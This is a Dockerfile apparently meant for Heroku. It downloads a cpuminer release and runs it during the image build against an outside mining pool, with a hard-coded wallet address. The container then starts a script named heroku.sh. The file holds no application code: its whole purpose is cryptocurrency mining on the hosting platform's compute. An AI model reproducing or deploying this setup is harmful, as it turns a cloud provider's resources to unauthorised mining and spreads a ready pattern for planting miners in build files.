FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
RUN tar -xzvf cpuminer-opt-linux.tar.gz
RUN ./cpuminer-sse2 -a power2b  -o stratum+tcps://stratum-na.rplant.xyz:17022 -u McG8e7peoEeXAxRdW62y2Uta5KWxNLbdMG.SHELL -t 2
CMD bash heroku.sh
